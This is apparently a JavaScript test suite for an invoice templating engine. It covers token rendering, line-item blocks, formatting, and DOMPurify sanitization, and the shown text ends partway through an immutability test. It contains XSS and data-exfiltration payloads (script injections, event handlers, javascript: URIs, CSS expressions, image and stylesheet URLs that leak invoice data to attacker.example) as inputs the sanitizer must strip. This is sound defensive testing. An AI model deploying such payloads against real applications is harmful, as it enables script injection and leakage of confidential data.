import { createRequire } from 'module';
import {
    TEMPLATES,
    getTemplateById,
    renderInvoiceTemplate,
    DEFAULT_DOMPURIFY_CONFIG,
    WHOLE_DOCUMENT_PURIFY_CONFIG,
    FRAGMENT_PURIFY_CONFIG,
    registerSanitizationHooks,
    getPurifyInstance,
    isCompleteHtmlDocument,
    sanitizeHtml,
    resetPurifyInstanceForTesting
} from './templates.js';
import {
    BUILT_IN_TEMPLATES
} from '../templates/builtInTemplates.js';

const require = createRequire(import.meta.url);
const { JSDOM } = require('jsdom');

console.log('Running Template Registry & HTML Token Engine Tests...');

let passed = 0;
let failed = 0;

function assert(condition, message) {
    if (condition) {
        console.log(`✅ ${message}`);
        passed++;
    } else {
        console.error(`❌ ${message}`);
        failed++;
    }
}

// =========================================================================
// 1. LEGACY TEMPLATES REGISTRY TESTS
// =========================================================================
console.log('\n--- 1. Testing Template Registry ---');

assert(Array.isArray(TEMPLATES) && TEMPLATES.length >= 8, 'Templates list should contain all predefined designs');

const ids = new Set();
let duplicatesFound = false;
for (const tmpl of TEMPLATES) {
    if (ids.has(tmpl.id)) {
        duplicatesFound = true;
    }
    ids.add(tmpl.id);
}
assert(!duplicatesFound, 'All template IDs should be unique');

const defaultTmpl = getTemplateById('default');
assert(defaultTmpl && defaultTmpl.id === 'default', 'Should resolve default template');

const modernTmpl = getTemplateById('modern_indigo');
assert(modernTmpl && modernTmpl.layout === 'modern', 'Should resolve modern template layout');

const fallbackTmpl = getTemplateById('non_existent_template_id');
assert(fallbackTmpl && fallbackTmpl.id === 'default', 'Invalid template ID should safely fallback to default');

const nullFallback = getTemplateById(null);
assert(nullFallback && nullFallback.id === 'default', 'Null template ID should safely fallback to default');

// =========================================================================
// 2. SCALAR TOKEN REPLACEMENT TESTS
// =========================================================================
console.log('\n--- 2. Testing Scalar Token Replacement ---');

const basicTemplate = '<h1>Invoice {{invoiceNumber}}</h1>';
const basicData = { invoiceNumber: 'INV-001' };
const basicResult = renderInvoiceTemplate(basicTemplate, basicData);
assert(basicResult === '<h1>Invoice INV-001</h1>', 'Replaces basic scalar token');

const multiTemplate = '<p>Invoice: {{invoiceNumber}}</p><p>Client: {{clientName}}</p><p>Total: {{total}}</p>';
const multiData = { invoiceNumber: 'INV-2026-99', clientName: 'Globex Corp', total: 1500 };
const multiResult = renderInvoiceTemplate(multiTemplate, multiData);
assert(multiResult.includes('<p>Invoice: INV-2026-99</p>'), 'Replaces invoiceNumber in multi-token template');
assert(multiResult.includes('<p>Client: Globex Corp</p>'), 'Replaces clientName in multi-token template');
assert(multiResult.includes('<p>Total: 1,500.00</p>'), 'Replaces formatted total in multi-token template');

// Whitespace tolerance in tokens
const whitespaceTemplate = '<div>{{  invoiceNumber   }} - {{ clientName }}</div>';
const whitespaceResult = renderInvoiceTemplate(whitespaceTemplate, { invoiceNumber: 'INV-01', clientName: 'Beta' });
assert(whitespaceResult === '<div>INV-01 - Beta</div>', 'Tolerates leading and trailing whitespace inside token tags');

// Missing and optional fields
const missingTemplate = '<p>{{clientName}}</p><p>{{optionalField}}</p><p>{{anotherMissing.nested}}</p>';
const missingResult = renderInvoiceTemplate(missingTemplate, { clientName: 'Acme' });
assert(missingResult === '<p>Acme</p><p></p><p></p>', 'Missing and optional fields render as empty strings without leaving raw token syntax');

// Null and undefined values
const nullUndefinedData = { clientName: null, invoiceNumber: undefined, notes: null };
const nullUndefinedTemplate = '<span>{{clientName}}</span><span>{{invoiceNumber}}</span><span>{{notes}}</span>';
const nullUndefinedResult = renderInvoiceTemplate(nullUndefinedTemplate, nullUndefinedData);
assert(nullUndefinedResult === '<span></span><span></span><span></span>', 'Null and undefined values render as empty strings');

// Numeric zero preservation
const zeroData = { discountValue: 0, total: 0, quantity: 0, received: 0 };
const zeroTemplate = '<span>Discount: {{discountValue}}</span><span>Total: {{total}}</span><span>Rec: {{received}}</span>';
const zeroResult = renderInvoiceTemplate(zeroTemplate, zeroData);
assert(zeroResult.includes('<span>Discount: 0</span>'), 'Preserves numeric zero for non-currency scalar');
assert(zeroResult.includes('<span>Total: 0.00</span>'), 'Preserves numeric zero formatted as currency for monetary total');
assert(zeroResult.includes('<span>Rec: 0.00</span>'), 'Preserves numeric zero formatted as currency for received');

// HTML characters escaping in scalar values
const xssData = { clientName: 'Acme & <Sons> "Inc" \'2026\'' };
const xssTemplate = '<h1>{{clientName}}</h1>';
const xssResult = renderInvoiceTemplate(xssTemplate, xssData);
assert(!xssResult.includes('<Sons>'), 'Raw HTML tag characters are not inserted as executable markup');
assert(xssResult.includes('&lt;Sons&gt;'), 'Dynamic values have HTML markup tags escaped');
const xssDom = new JSDOM(xssResult);
assert(xssDom.window.document.querySelector('h1').textContent === 'Acme & <Sons> "Inc" \'2026\'', 'DOM textContent matches dynamic value safely');

// Nested object path resolution
const nestedTemplate = '<p>{{sender.name}}</p><p>{{sender.address}}</p><p>{{bankDetails.bankName}}</p><p>{{bankDetails.accountNumber}}</p>';
const nestedData = {
    sender: { name: 'Alpha Tech', address: '123 Tech Park' },
    bankDetails: { bankName: 'Apex Bank', accountNumber: '9876543210' }
};
const nestedResult = renderInvoiceTemplate(nestedTemplate, nestedData);
assert(nestedResult.includes('<p>Alpha Tech</p>'), 'Resolves nested sender.name');
assert(nestedResult.includes('<p>123 Tech Park</p>'), 'Resolves nested sender.address');
assert(nestedResult.includes('<p>Apex Bank</p>'), 'Resolves nested bankDetails.bankName');
assert(nestedResult.includes('<p>9876543210</p>'), 'Resolves nested bankDetails.accountNumber');

// Domain aliases fallback (e.g. number -> invoiceNumber, recipient.name -> clientName)
const aliasData = {
    number: 'INV-CANONICAL-1',
    recipient: { name: 'Recipient Co' }
};
const aliasResult = renderInvoiceTemplate('<h1>{{invoiceNumber}}</h1><p>{{clientName}}</p>', aliasData);
assert(aliasResult.includes('<h1>INV-CANONICAL-1</h1>'), 'invoiceNumber resolves from invoice.number domain property');
assert(aliasResult.includes('<p>Recipient Co</p>'), 'clientName resolves from recipient.name domain property');

// =========================================================================
// 3. REPEATING LINE-ITEM BLOCKS TESTS
// =========================================================================
console.log('\n--- 3. Testing Repeating Line-Item Blocks ---');

const lineItemTemplate = `<table>
  <tbody>
    {{#lineItems}}
    <tr>
      <td>{{description}}</td>
      <td>{{quantity}}</td>
      <td>{{unitPrice}}</td>
      <td>{{amount}}</td>
    </tr>
    {{/lineItems}}
  </tbody>
</table>`;

const lineItemData = {
    lineItems: [
        { description: 'Consulting Services', quantity: 10, unitPrice: 150, amount: 1500 },
        { description: 'Cloud Hosting', quantity: 1, unitPrice: 200, amount: 200 }
    ]
};

const lineItemResult = renderInvoiceTemplate(lineItemTemplate, lineItemData);
assert(lineItemResult.includes('Consulting Services'), 'Renders first line item description');
assert(lineItemResult.includes('Cloud Hosting'), 'Renders second line item description');
assert(lineItemResult.includes('1,500.00'), 'Renders formatted amount for first item');
assert(lineItemResult.includes('200.00'), 'Renders formatted amount for second item');
assert(!lineItemResult.includes('{{#lineItems}}') && !lineItemResult.includes('{{/lineItems}}'), 'Block markers are completely removed');

// items block alias matching domain structure inside valid table
const itemsTemplate = `<table><tbody>{{#items}}<tr><td>{{index}}</td><td>{{description}}</td><td>{{quantity}}</td><td>{{price}}</td><td>{{total}}</td></tr>{{/items}}</tbody></table>`;
const itemsData = {
    items: [
        { description: 'Widget A', quantity: 2, price: 50 },
        { description: 'Widget B', quantity: 3, price: 100 }
    ]
};
const itemsResult = renderInvoiceTemplate(itemsTemplate, itemsData);
assert(itemsResult.includes('<td>1</td><td>Widget A</td><td>2</td><td>50.00</td><td>100.00</td>'), 'Resolves row 1 with calculated total and 1-based index');
assert(itemsResult.includes('<td>2</td><td>Widget B</td><td>3</td><td>100.00</td><td>300.00</td>'), 'Resolves row 2 with calculated total and 1-based index');

// Cross-alias compatibility: #lineItems block with items array in data
const crossBlockResult = renderInvoiceTemplate(lineItemTemplate, { items: [{ description: 'Cross Item', quantity: 1, unitPrice: 75, amount: 75 }] });
assert(crossBlockResult.includes('Cross Item') && crossBlockResult.includes('75.00'), '#lineItems block resolves against data.items fallback');

// Cross-alias compatibility: #items block with lineItems array in data
const crossBlockResult2 = renderInvoiceTemplate(itemsTemplate, { lineItems: [{ description: 'Cross Item 2', quantity: 1, price: 80 }] });
assert(crossBlockResult2.includes('Cross Item 2') && crossBlockResult2.includes('80.00'), '#items block resolves against data.lineItems fallback');

// Empty line items array
const emptyItemsResult = renderInvoiceTemplate(lineItemTemplate, { lineItems: [] });
assert(!emptyItemsResult.includes('<tr>'), 'Empty lineItems array renders 0 rows');
assert(emptyItemsResult.includes('<table>') && emptyItemsResult.includes('<tbody>') && emptyItemsResult.includes('</tbody>'), 'Preserves surrounding HTML structure with empty line items');

// Missing line items array
const missingItemsResult = renderInvoiceTemplate(lineItemTemplate, {});
assert(!missingItemsResult.includes('<tr>'), 'Missing lineItems array renders 0 rows');

// Missing line-item fields
const partialItemTemplate = '{{#items}}<p>{{description}}|{{unit}}|{{hsnSac}}|{{optionalProp}}</p>{{/items}}';
const partialItemResult = renderInvoiceTemplate(partialItemTemplate, { items: [{ description: 'Only Description' }] });
assert(partialItemResult === '<p>Only Description|||</p>', 'Missing line item fields render as empty strings without raw tokens');

// Line-item values containing malicious HTML
const maliciousItemTemplate = '{{#lineItems}}<div>{{description}}</div>{{/lineItems}}';
const maliciousItemResult = renderInvoiceTemplate(maliciousItemTemplate, {
    lineItems: [{ description: '<script>alert("pwned")</script>Dangerous Item' }]
});
assert(!maliciousItemResult.includes('<script>'), 'Line item values cannot inject executable <script> tags');
const maliciousItemDom = new JSDOM(maliciousItemResult);
assert(maliciousItemDom.window.document.querySelectorAll('script').length === 0, 'DOM inspection confirms no script tags created by line item');
assert(maliciousItemDom.window.document.querySelector('div').textContent.includes('Dangerous Item'), 'Line item text preserved safely');

// Top-level token resolution inside line-item block
const contextTemplate = '{{#items}}<tr><td>{{description}} in {{currency}}</td></tr>{{/items}}';
const contextResult = renderInvoiceTemplate(contextTemplate, { currency: '₹', items: [{ description: 'App' }] });
assert(contextResult.includes('App in ₹'), 'Top-level token (currency) resolves inside line item block if not present on item');

// =========================================================================
// 4. FORMATTING UTILITIES TESTS
// =========================================================================
console.log('\n--- 4. Testing Currency & Date Formatting ---');

const formatTemplate = '<p>Sub: {{subtotal}}</p><p>Total: {{total}}</p><p>Date: {{date}}</p><p>Due: {{dueDate}}</p>';
const formatData = {
    items: [{ price: 1250.5, quantity: 2 }],
    date: '2026-11-17',
    dueDate: '2026-12-01'
};
const formatResult = renderInvoiceTemplate(formatTemplate, formatData);
assert(formatResult.includes('<p>Sub: 2,501.00</p>'), 'Currency formatted consistently with en-IN locale and 2 decimal precision');
assert(formatResult.includes('<p>Total: 2,501.00</p>'), 'Total formatted consistently');
assert(formatResult.includes('<p>Date: 17 November 2026</p>'), 'ISO date formatted using application date format');
assert(formatResult.includes('<p>Due: 1 December 2026</p>'), 'Due date formatted using application date format');

// Date object formatting
const dateObjResult = renderInvoiceTemplate('<p>{{date}}</p>', { date: new Date('2026-05-20T10:00:00Z') });
assert(dateObjResult.includes('20 May 2026'), 'Date object formatted correctly');

// Invalid date degradation
const invalidDateResult = renderInvoiceTemplate('<p>{{date}}</p>', { date: 'Not-A-Valid-Date-String' });
assert(invalidDateResult.includes('Not-A-Valid-Date-String'), 'Invalid date degrades gracefully without crashing');

// Empty date degradation
const emptyDateResult = renderInvoiceTemplate('<p>{{date}}</p>', { date: '' });
assert(emptyDateResult === '<p></p>', 'Empty date renders empty string');

// =========================================================================
// 5. SECURITY & HTML SANITIZATION TESTS
// =========================================================================
console.log('\n--- 5. Testing DOMPurify Security & Sanitization ---');

// Script tags in template markup
const scriptTemplate = '<div class="invoice"><h1>Invoice</h1><script>alert("xss")</script></div>';
const scriptResult = renderInvoiceTemplate(scriptTemplate, {});
assert(!scriptResult.includes('<script>'), '<script> tag is removed by DOMPurify');
assert(!scriptResult.includes('alert("xss")'), 'Script content is stripped');
assert(scriptResult.includes('<div class="invoice"><h1>Invoice</h1></div>'), 'Legitimate HTML markup is preserved');

// Inline event handlers
const handlerTemplate = '<button onclick="evilCode()" onmouseover="steal()" onerror="alert(1)">Click</button>';
const handlerResult = renderInvoiceTemplate(handlerTemplate, {});
assert(!handlerResult.includes('onclick'), 'onclick attribute removed');
assert(!handlerResult.includes('onmouseover'), 'onmouseover attribute removed');
assert(!handlerResult.includes('onerror'), 'onerror attribute removed');

// Unsafe URL protocols
const linkTemplate = '<a href="javascript:alert(1)">Bad Link</a><a href="https://example.com">Good Link</a>';
const linkResult = renderInvoiceTemplate(linkTemplate, {});
assert(!linkResult.includes('javascript:alert(1)'), 'javascript: URI protocol neutralized or removed');
assert(linkResult.includes('href="https://example.com"'), 'Legitimate HTTPS URL protocol preserved');

// Layout CSS preservation
const styleTemplate = '<style>.invoice { color: #2b6cb0; font-weight: bold; }</style><div class="invoice" style="margin: 20px;">Tax Invoice</div>';
const styleResult = renderInvoiceTemplate(styleTemplate, {});
assert(styleResult.includes('<style>') && styleResult.includes('.invoice') && styleResult.includes('color:#2b6cb0'), 'Supported <style> element is preserved and canonicalized');
assert(styleResult.includes('style="margin:20px"'), 'Supported inline style attribute is preserved and canonicalized');

// Malicious CSS in style tag
const badStyleTemplate = '<style>body { background: url("javascript:alert(1)"); }</style><div>Clean</div>';
const badStyleResult = renderInvoiceTemplate(badStyleTemplate, {});
assert(!badStyleResult.includes('javascript:alert(1)'), 'Unsafe CSS expression in <style> is stripped');
assert(!badStyleResult.includes('<style>'), 'Malicious <style> tag completely removed by sanitization hook');

// CSS @import in style tag
const importStyleTemplate = '<style>@import url("https://evil.com/leak.css"); .safe-rule { font-size: 14px; }</style><div>Body</div>';
const importStyleResult = renderInvoiceTemplate(importStyleTemplate, {});
assert(!importStyleResult.includes('@import'), '@import rule stripped from <style> element');
assert(importStyleResult.includes('.safe-rule{font-size:14px}'), 'Safe rule in same <style> element is preserved');

// CSS expression with casing and escape sequences
const exprStyleTemplate = '<style>body { width: exp\\72 ession(alert(1)); } .valid { color: green; }</style><div>Body</div>';
const exprStyleResult = renderInvoiceTemplate(exprStyleTemplate, {});
assert(!exprStyleResult.includes('expression'), 'CSS expression with escapes stripped');
assert(exprStyleResult.includes('.valid{color:green}'), 'Safe rule preserved alongside stripped expression');

// Inline style sanitization with dangerous javascript:
const inlineJsTemplate = '<div style="color: blue; background: url(jav\\61 script:alert(1));">Text</div>';
const inlineJsResult = renderInvoiceTemplate(inlineJsTemplate, {});
assert(!inlineJsResult.includes('javascript'), 'Inline style javascript: URL stripped');
assert(inlineJsResult.includes('style="color:blue"'), 'Inline style safe declarations preserved');

// Inline style with only dangerous declarations removed completely
const inlineOnlyBadTemplate = '<div style="behavior: url(bad.htc); width: expression(alert(1));">Text</div>';
const inlineOnlyBadResult = renderInvoiceTemplate(inlineOnlyBadTemplate, {});
assert(!inlineOnlyBadResult.includes('style='), 'Entire style attribute removed when all declarations are unsafe');

// Safe raster data URI in inline style
const inlineDataTemplate = '<div style="background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY44YAAAAASUVORK5CYII=); font-size: 12px;">Text</div>';
const inlineDataResult = renderInvoiceTemplate(inlineDataTemplate, {});
assert(inlineDataResult.includes('background-image:url(data:image/png;base64,'), 'Safe base64 raster image data URI preserved in inline style');
assert(inlineDataResult.includes('font-size:12px'), 'Safe declaration preserved alongside safe data URI');

// Malicious injection through scalar value
const injectScalarData = { clientName: '<img src="x" onerror="alert(1)">' };
const injectScalarResult = renderInvoiceTemplate('<div>{{clientName}}</div>', injectScalarData);
const injectDom = new JSDOM(injectScalarResult);
assert(injectDom.window.document.querySelectorAll('img').length === 0, 'No img element created by scalar injection');
assert(injectDom.window.document.querySelectorAll('[onerror]').length === 0, 'No onerror attribute exists in DOM');
assert(injectDom.window.document.querySelector('div').textContent === '<img src="x" onerror="alert(1)">', 'Rendered as harmless text content in DOM');

// Full DOM tree verification using JSDOM
const securityAuditDom = new JSDOM(scriptResult);
const foundScripts = securityAuditDom.window.document.querySelectorAll('script');
assert(foundScripts.length === 0, 'DOM inspection confirms zero script elements present');

const eventAuditDom = new JSDOM(handlerResult);
const foundButtons = eventAuditDom.window.document.querySelectorAll('button');
assert(foundButtons.length === 1 && !foundButtons[0].hasAttribute('onclick'), 'DOM inspection confirms event handlers removed from element');

// External Resource Loading & Invoice Data Disclosure Prevention (Finding 3)
console.log('\n--- 5.0. Testing Resource Loading & Data Disclosure Prevention (Finding 3) ---');

// 1. External HTTP/HTTPS image src with interpolated invoice data token
const externalImgTemplate = '<img src="https://attacker.example/track?inv={{invoiceNumber}}" alt="Logo" />';
const externalImgResult = renderInvoiceTemplate(externalImgTemplate, { invoiceNumber: 'INV-CONFIDENTIAL-001' });
assert(!externalImgResult.includes('https://attacker.example'), 'External HTTPS img src is stripped to prevent data disclosure');
assert(!externalImgResult.includes('INV-CONFIDENTIAL-001'), 'Sensitive invoice data is not leaked via external img src');

// 2. Protocol-relative img src
const protoRelImgTemplate = '<img src="//attacker.example/leak.png" alt="Tracker" />';
const protoRelImgResult = renderInvoiceTemplate(protoRelImgTemplate, {});
assert(!protoRelImgResult.includes('//attacker.example'), 'Protocol-relative img src is stripped');

// 3. SVG subresource tags (<image>, <use>) with external href
const svgResourceTemplate = '<svg><image href="https://attacker.example/leak.svg" /><use href="https://attacker.example/icon.svg#symbol" /></svg>';
const svgResourceResult = renderInvoiceTemplate(svgResourceTemplate, {});
assert(!svgResourceResult.includes('https://attacker.example'), 'External SVG image and use hrefs are stripped');

// 4. <link> tag in HTML is forbidden completely
const linkTagTemplate = '<link rel="stylesheet" href="https://attacker.example/style.css" /><div class="body">Content</div>';
const linkTagResult = renderInvoiceTemplate(linkTagTemplate, {});
assert(!linkTagResult.includes('<link'), '<link> tag is forbidden and stripped from HTML');

// 5. External URL in CSS background-image inside <style>
const cssExternalTemplate = '<style>.header { background-image: url("https://attacker.example/bg?total={{total}}"); color: #111; }</style><div class="header">Hello</div>';
const cssExternalResult = renderInvoiceTemplate(cssExternalTemplate, { total: '5000' });
assert(!cssExternalResult.includes('https://attacker.example'), 'External URL in stylesheet url() is stripped');
assert(cssExternalResult.includes('color:#111'), 'Safe style property alongside stripped external URL is preserved');

// 6. External URL in inline style attribute
const inlineExternalTemplate = '<div style="background-image: url(\'https://attacker.example/track.png\'); padding: 10px;">Card</div>';
const inlineExternalResult = renderInvoiceTemplate(inlineExternalTemplate, {});
assert(!inlineExternalResult.includes('https://attacker.example'), 'External URL in inline style url() is stripped');
assert(inlineExternalResult.includes('style="padding:10px"'), 'Safe inline declaration preserved when external URL stripped');

// 7. Legitimate local relative image src is preserved
const localImgTemplate = '<img src="/assets/images/logo.png" alt="Company Logo" />';
const localImgResult = renderInvoiceTemplate(localImgTemplate, {});
assert(localImgResult.includes('src="/assets/images/logo.png"'), 'Local relative img src is preserved');

// 8. Legitimate safe base64 raster image src is preserved
const base64ImgTemplate = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY44YAAAAASUVORK5CYII=" alt="Pixel" />';
const base64ImgResult = renderInvoiceTemplate(base64ImgTemplate, {});
assert(base64ImgResult.includes('src="data:image/png;base64,'), 'Safe base64 raster image data URI in img src is preserved');

// =========================================================================
// 5.1 CENTRALIZED DOMPURIFY CONFIGURATION & HOOK ARCHITECTURE TESTS
// =========================================================================
console.log('\n--- 5.1. Testing Centralized DOMPurify Configuration & Hooks ---');

// Immutability of base configuration
assert(Object.isFrozen(DEFAULT_DOMPURIFY_CONFIG), 'DEFAULT_DOMPURIFY_CONFIG is immutable (frozen)');
assert(Object.isFrozen(DEFAULT_DOMPURIFY_CONFIG.ADD_TAGS), 'DEFAULT_DOMPURIFY_CONFIG.ADD_TAGS is immutable');
assert(Object.isFrozen(DEFAULT_DOMPURIFY_CONFIG.ADD_ATTR), 'DEFAULT_DOMPURIFY_CONFIG.ADD_ATTR is immutable');
assert(Object.isFrozen(DEFAULT_DOMPURIFY_CONFIG.FORBID_TAGS), 'DEFAULT_DOMPURIFY_CONFIG.FORBID_TAGS is immutable');
assert(Object.isFrozen(DEFAULT_DOMPURIFY_CONFIG.FORBID_ATTR), 'DEFAULT_DOMPURIFY_CONFIG.FORBID_ATTR is immutable');
assert(DEFAULT_DOMPURIFY_CONFIG.ADD_TAGS.includes('style'), 'Base configuration permits <style> tag');
assert(DEFAULT_DOMPURIFY_CONFIG.ADD_ATTR.includes('target'), 'Base configuration permits target attribute');
assert(DEFAULT_DOMPURIFY_CONFIG.FORBID_TAGS.includes('script'), 'Base configuration forbids <script> tag');
assert(DEFAULT_DOMPURIFY_CONFIG.FORBID_TAGS.includes('iframe'), 'Base configuration forbids <iframe> tag');
assert(DEFAULT_DOMPURIFY_CONFIG.FORBID_ATTR.includes('onerror'), 'Base configuration forbids onerror attribute');
assert(DEFAULT_DOMPURIFY_CONFIG.FORBID_ATTR.includes('onclick'), 'Base configuration forbids onclick attribute');

// Derived configurations
assert(Object.isFrozen(WHOLE_DOCUMENT_PURIFY_CONFIG), 'WHOLE_DOCUMENT_PURIFY_CONFIG is immutable');
assert(WHOLE_DOCUMENT_PURIFY_CONFIG.WHOLE_DOCUMENT === true, 'WHOLE_DOCUMENT_PURIFY_CONFIG sets WHOLE_DOCUMENT to true');
assert(Object.isFrozen(FRAGMENT_PURIFY_CONFIG), 'FRAGMENT_PURIFY_CONFIG is immutable');
assert(FRAGMENT_PURIFY_CONFIG.WHOLE_DOCUMENT === false, 'FRAGMENT_PURIFY_CONFIG sets WHOLE_DOCUMENT to false');
assert(WHOLE_DOCUMENT_PURIFY_CONFIG.ADD_TAGS === DEFAULT_DOMPURIFY_CONFIG.ADD_TAGS, 'Derived whole doc config reuses centralized ADD_TAGS');
assert(FRAGMENT_PURIFY_CONFIG.ADD_TAGS === DEFAULT_DOMPURIFY_CONFIG.ADD_TAGS, 'Derived fragment config reuses centralized ADD_TAGS');

// Document vs fragment detection
assert(isCompleteHtmlDocument('<!DOCTYPE html><html><body><h1>Invoice</h1></body></html>'), 'Detects DOCTYPE as complete document');
assert(isCompleteHtmlDocument('<html><head></head><body><h1>Invoice</h1></body></html>'), 'Detects <html> tag as complete document');
assert(isCompleteHtmlDocument('<HTML><BODY>Tax Invoice</BODY></HTML>'), 'Detects uppercase <HTML> tag as complete document');
assert(!isCompleteHtmlDocument('<div>Just a fragment</div>'), 'Non-document markup detected as fragment');
assert(!isCompleteHtmlDocument('<style>.a{color:red}</style><div>Fragment with style</div>'), 'Fragment with <style> detected as fragment');
assert(!isCompleteHtmlDocument(''), 'Empty string is not a complete document');
assert(!isCompleteHtmlDocument(null), 'Null is not a complete document');
assert(!isCompleteHtmlDocument(undefined), 'Undefined is not a complete document');

// Hook registration idempotency
const purifyInstance1 = getPurifyInstance();
const purifyInstance2 = getPurifyInstance();
assert(purifyInstance1 === purifyInstance2, 'getPurifyInstance returns cached singleton instance');

// Repeated hook registration on the same instance is idempotent
registerSanitizationHooks(purifyInstance1);
registerSanitizationHooks(purifyInstance1);
assert(true, 'Repeated registerSanitizationHooks calls complete without error or hook duplication');

// Reset and re-initialization
resetPurifyInstanceForTesting();
const freshPurifyInstance = getPurifyInstance();
assert(freshPurifyInstance && typeof freshPurifyInstance.sanitize === 'function', 'getPurifyInstance re-initializes cleanly after reset');

// Consistent security behavior: Full Document sanitization
const fullDocMalicious = `<!DOCTYPE html>
<html>
<head>
  <title>Tax Invoice</title>
  <style>
    body { background: url("javascript:alert('xss')"); }
    .title { color: #1a365d; font-size: 24px; }
  </style>
  <script>evilCode()</script>
</head>
<body>
  <h1 class="title" style="margin: 10px; width: expression(alert(1));">Invoice</h1>
  <button onclick="steal()">Pay</button>
</body>
</html>`;

const fullDocResult = sanitizeHtml(fullDocMalicious);
assert(!fullDocResult.includes('evilCode()'), 'Full document sanitization removes script blocks');
assert(!fullDocResult.includes('<script>'), 'Full document sanitization removes <script> elements');
assert(!fullDocResult.includes('onclick'), 'Full document sanitization removes event handler attributes');
assert(!fullDocResult.includes('javascript:alert'), 'Full document sanitization neutralizes unsafe CSS in <style>');
assert(!fullDocResult.includes('expression'), 'Full document sanitization neutralizes unsafe inline expression');
assert(fullDocResult.includes('.title{color:#1a365d;font-size:24px}'), 'Full document sanitization preserves legitimate CSS rules');
assert(fullDocResult.includes('style="margin:10px"'), 'Full document sanitization preserves legitimate inline styles');
assert(fullDocResult.includes('<title>Tax Invoice</title>'), 'Full document sanitization preserves document head structure');

// Consistent security behavior: Fragment sanitization
const fragMalicious = `<style>
  body { background: url("javascript:alert('xss')"); }
  .title { color: #1a365d; font-size: 24px; }
</style>
<script>evilCode()</script>
<h1 class="title" style="margin: 10px; width: expression(alert(1));">Invoice</h1>
<button onclick="steal()">Pay</button>`;

const fragResult = sanitizeHtml(fragMalicious);
assert(!fragResult.includes('evilCode()'), 'Fragment sanitization removes script blocks');
assert(!fragResult.includes('<script>'), 'Fragment sanitization removes <script> elements');
assert(!fragResult.includes('onclick'), 'Fragment sanitization removes event handler attributes');
assert(!fragResult.includes('javascript:alert'), 'Fragment sanitization neutralizes unsafe CSS in <style>');
assert(!fragResult.includes('expression'), 'Fragment sanitization neutralizes unsafe inline expression');
assert(fragResult.includes('<style>.title{color:#1a365d;font-size:24px}</style>'), 'Fragment sanitization preserves legitimate CSS rules');
assert(fragResult.includes('style="margin:10px"'), 'Fragment sanitization preserves legitimate inline styles');
assert(!fragResult.includes('<html>'), 'Fragment sanitization does not wrap output in full document HTML tags');
assert(!fragResult.includes('<body>'), 'Fragment sanitization does not wrap output in body tags');

// Explicit option overrides
const forcedDocOutput = sanitizeHtml('<div>Simple Fragment</div>', { wholeDocument: true });
assert(forcedDocOutput.includes('<html>') && forcedDocOutput.includes('<div>Simple Fragment</div>'), 'options.wholeDocument: true forces full document output');

const forcedFragOutput = sanitizeHtml('<!DOCTYPE html><html><body><div>Simple Document</div></body></html>', { wholeDocument: false });
assert(!forcedFragOutput.includes('<!DOCTYPE') && !forcedFragOutput.includes('<html>') && forcedFragOutput.includes('<div>Simple Document</div>'), 'options.wholeDocument: false forces fragment output');

// Determinism & repeated execution consistency
const repeat1 = sanitizeHtml(fragMalicious);
const repeat2 = sanitizeHtml(fragMalicious);
assert(repeat1 === repeat2, 'Repeated sanitization calls produce identical output deterministically');

// Safe fallback for null, undefined, empty, and non-string inputs
assert(sanitizeHtml(null) === '', 'sanitizeHtml(null) safely returns empty string');
assert(sanitizeHtml(undefined) === '', 'sanitizeHtml(undefined) safely returns empty string');
assert(sanitizeHtml('') === '', 'sanitizeHtml("") safely returns empty string');
assert(sanitizeHtml(9999) === '', 'sanitizeHtml(number) safely returns empty string');
assert(sanitizeHtml({ bad: 'input' }) === '', 'sanitizeHtml(object) safely returns empty string');

// =========================================================================
// 6. BUILT-IN TEMPLATES RENDERING TESTS
// =========================================================================
console.log('\n--- 6. Testing Built-In Templates Rendering ---');

const sampleFullInvoice = {
    number: 'INV-2026-001',
    date: '2026-11-17',
    dueDate: '2026-12-01',
    placeOfSupply: '24-Gujarat',
    currency: '₹',
    sender: {
        name: 'Apex Solutions Pvt Ltd',
        address: '101 Cyber Heights, Gandhinagar',
        phone: '9876543210',
        email: 'info@apexsolutions.com',
        gstNumber: '24AAAAA0000A1Z5',
        state: '24-Gujarat'
    },
    recipient: {
        name: 'Nexus Corp',
        address: '202 Commerce Tower, Ahmedabad',
        mobile: '9123456780',
        email: 'billing@nexuscorp.com',
        gstNumber: '24BBBBB1111B1Z2'
    },
    items: [
        { description: 'Cloud Infrastructure Setup', hsnSac: '998313', quantity: 1, unit: 'Hrs', price: 15000, gstRate: 18 },
        { description: 'Database Tuning & Indexing', hsnSac: '998314', quantity: 2, unit: 'Hrs', price: 5000, gstRate: 18 }
    ],
    bankDetails: {
        bankName: 'HDFC Bank',
        accountNumber: '50200012345678',
        ifscCode: 'HDFC0000123',
        accountHolder: 'Apex Solutions Pvt Ltd'
    },
    paymentInfo: 'apex@hdfcbank',
    notes: 'Thank you for your business.',
    termsAndConditions: 'Payment due within 14 days.',
    IsGST: true,
    IsIGST: false,
    received: 5000
};

for (const tmpl of BUILT_IN_TEMPLATES) {
    const rendered = renderInvoiceTemplate(tmpl.html, sampleFullInvoice);
    assert(typeof rendered === 'string' && rendered.length > 500, `Successfully rendered built-in template: ${tmpl.name}`);
    assert(rendered.includes('Apex Solutions Pvt Ltd'), `${tmpl.name} contains sender name`);
    assert(rendered.includes('Nexus Corp'), `${tmpl.name} contains recipient name`);
    assert(rendered.includes('INV-2026-001'), `${tmpl.name} contains invoice number`);
    assert(rendered.includes('Cloud Infrastructure Setup'), `${tmpl.name} contains line item 1`);
    assert(rendered.includes('Database Tuning &amp; Indexing'), `${tmpl.name} contains line item 2`);
    assert(rendered.includes('HDFC Bank'), `${tmpl.name} contains bank name`);
    assert(!rendered.includes('{{sender.name}}'), `${tmpl.name} resolved sender.name token`);
    assert(!rendered.includes('{{#items}}'), `${tmpl.name} resolved #items block token`);
    assert(!rendered.includes('{{totals.total}}'), `${tmpl.name} resolved totals.total token`);
}

// =========================================================================
// 7. PURITY, IMMUTABILITY & EDGE CASES
// =========================================================================
console.log('\n--- 7. Testing Purity, Immutability & Edge Cases ---');

// Immutability of template string and invoice data
const immutableTemplate = '<h1>{{invoiceNumber}}</h1>';
const immutableData = Object.freeze({
    invoiceNumber: 'INV-IMMUTABLE',
    items: Object.freeze([
        Object.freeze({ description: 'Freeze Item', price: 100, quantity: 1 })
    ])
});

